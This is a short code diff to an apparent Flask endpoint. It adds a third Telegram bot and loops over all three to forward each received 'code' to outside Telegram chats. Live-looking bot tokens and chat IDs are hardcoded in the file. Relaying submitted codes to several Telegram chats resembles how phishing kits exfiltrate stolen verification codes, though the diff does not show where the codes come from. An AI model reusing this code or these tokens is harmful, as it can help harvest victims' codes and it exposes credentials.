@@ -11,6 +11,10 @@ BOT_1_CHAT_ID = '5214147917'
 BOT_2_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
 BOT_2_CHAT_ID = '6297861735'
 
+# Bot 3
+BOT_3_TOKEN = '8185981027:AAH6QYJxVlYpZl8sv2nPzjj6zcmdxaop6KA'
+BOT_3_CHAT_ID = '5974789663'
+
 def send_telegram_message(bot_token, chat_id, message):
     return requests.post(
         f"https://api.telegram.org/bot{bot_token}/sendMessage",
@@ -30,13 +34,15 @@ def send_code():
     if code:
         message = f"Code reçu : {code}"
 
-        # Envoi au bot 1
-        resp1 = send_telegram_message(BOT_1_TOKEN, BOT_1_CHAT_ID, message)
-        print("Bot 1 Telegram:", resp1.text)
+        bots = [
+            (BOT_1_TOKEN, BOT_1_CHAT_ID),
+            (BOT_2_TOKEN, BOT_2_CHAT_ID),
+            (BOT_3_TOKEN, BOT_3_CHAT_ID)
+        ]
 
-        # Envoi au bot 2
-        resp2 = send_telegram_message(BOT_2_TOKEN, BOT_2_CHAT_ID, message)
-        print("Bot 2 Telegram:", resp2.text)
+        for i, (token, chat_id) in enumerate(bots, start=1):
+            response = send_telegram_message(token, chat_id, message)
+            print(f"Bot {i} Telegram:", response.text)
 
         return jsonify({'status': 'success'}), 200
     else:
